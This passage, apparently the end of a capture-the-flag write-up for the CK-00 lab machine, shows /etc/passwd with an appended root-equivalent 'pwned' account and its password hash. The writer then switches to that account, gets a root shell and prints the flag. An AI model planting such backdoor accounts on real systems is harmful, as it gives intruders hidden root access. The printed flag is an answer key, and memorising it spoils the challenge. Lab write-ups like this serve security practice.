irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
ck-00:x:1000:1000:CyberKnight:/home/ck:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
bla1:x:1001:1001:Bla 1,01,0000,0001:/home/bla1:/bin/bash
bla:x:1002:1002:bla,0000,0000,0000:/home/bla:/bin/bash
pwned:$6$APPYY.XIc0HgWRVH$RUIFlXkEHtaq2wdiqMx4mki133iuFrIDWeLGx3LmlkMwguoVvkVVzlxkeD0Glh1y2.BHsveSIkJlBe5/BOwzG/:0:0:/root:/bin/bash
ck-00@ck00:/tmp$ su pwned
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
ck00-root-flag.txt
# cat ck00-root-flag.txt
 ▄▄▄▄▄▄▄▄▄▄▄ ▄         ▄ ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄    ▄ ▄▄        ▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄         ▄ ▄▄▄▄▄▄▄▄▄▄▄        ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▐░▌       ▐░▐░░░░░░░░░░▌▐░░░░░░░░░░░▐░░░░░░░░░░░▐░▌  ▐░▐░░▌      ▐░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░▌       ▐░▐░░░░░░░░░░░▌      ▐░░░░░░░░░▌ ▐░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀▀▀▐░▌       ▐░▐░█▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀▀▀▀█░▐░▌ ▐░▌▐░▌░▌     ▐░▌▀▀▀▀█░█▀▀▀▀▐░█▀▀▀▀▀▀▀▀▀▐░▌       ▐░▌▀▀▀▀█░█▀▀▀▀      ▐░█░█▀▀▀▀▀█░▐░█░█▀▀▀▀▀█░▌
▐░▌         ▐░▌       ▐░▐░▌       ▐░▐░▌         ▐░▌       ▐░▐░▌▐░▌ ▐░▌▐░▌    ▐░▌    ▐░▌    ▐░▌         ▐░▌       ▐░▌    ▐░▌          ▐░▌▐░▌    ▐░▐░▌▐░▌    ▐░▌
▐░▌         ▐░█▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄█░▐░▌░▌  ▐░▌ ▐░▌   ▐░▌    ▐░▌    ▐░▌ ▄▄▄▄▄▄▄▄▐░█▄▄▄▄▄▄▄█░▌    ▐░▌          ▐░▌ ▐░▌   ▐░▐░▌ ▐░▌   ▐░▌
▐░▌         ▐░░░░░░░░░░░▐░░░░░░░░░░▌▐░░░░░░░░░░░▐░░░░░░░░░░░▐░░▌   ▐░▌  ▐░▌  ▐░▌    ▐░▌    ▐░▌▐░░░░░░░░▐░░░░░░░░░░░▌    ▐░▌          ▐░▌  ▐░▌  ▐░▐░▌  ▐░▌  ▐░▌
▐░▌          ▀▀▀▀█░█▀▀▀▀▐░█▀▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀▀▀▐░█▀▀▀▀█░█▀▀▐░▌░▌  ▐░▌   ▐░▌ ▐░▌    ▐░▌    ▐░▌ ▀▀▀▀▀▀█░▐░█▀▀▀▀▀▀▀█░▌    ▐░▌          ▐░▌   ▐░▌ ▐░▐░▌   ▐░▌ ▐░▌
▐░▌              ▐░▌    ▐░▌       ▐░▐░▌         ▐░▌     ▐░▌ ▐░▌▐░▌ ▐░▌    ▐░▌▐░▌    ▐░▌    ▐░▌       ▐░▐░▌       ▐░▌    ▐░▌          ▐░▌    ▐░▌▐░▐░▌    ▐░▌▐░▌
▐░█▄▄▄▄▄▄▄▄▄     ▐░▌    ▐░█▄▄▄▄▄▄▄█░▐░█▄▄▄▄▄▄▄▄▄▐░▌      ▐░▌▐░▌ ▐░▌▐░▌     ▐░▐░▌▄▄▄▄█░█▄▄▄▄▐░█▄▄▄▄▄▄▄█░▐░▌       ▐░▌    ▐░▌          ▐░█▄▄▄▄▄█░█░▐░█▄▄▄▄▄█░█░▌
▐░░░░░░░░░░░▌    ▐░▌    ▐░░░░░░░░░░▌▐░░░░░░░░░░░▐░▌       ▐░▐░▌  ▐░▐░▌      ▐░░▐░░░░░░░░░░░▐░░░░░░░░░░░▐░▌       ▐░▌    ▐░▌           ▐░░░░░░░░░▌ ▐░░░░░░░░░▌ 
 ▀▀▀▀▀▀▀▀▀▀▀      ▀      ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ ▀         ▀ ▀    ▀ ▀        ▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀         ▀      ▀             ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀  
                                                                                                                                                              


flag = c0523985a2640ad30429fb2055196e4c

Thia flag is a proof that you get the root shell.

You have to submit your report contaning all steps you take to get root shell.

Send your report to our official mail : vishalbiswas420@gmail.com
# 
```

> Root Flag: c0523985a2640ad30429fb2055196e4c















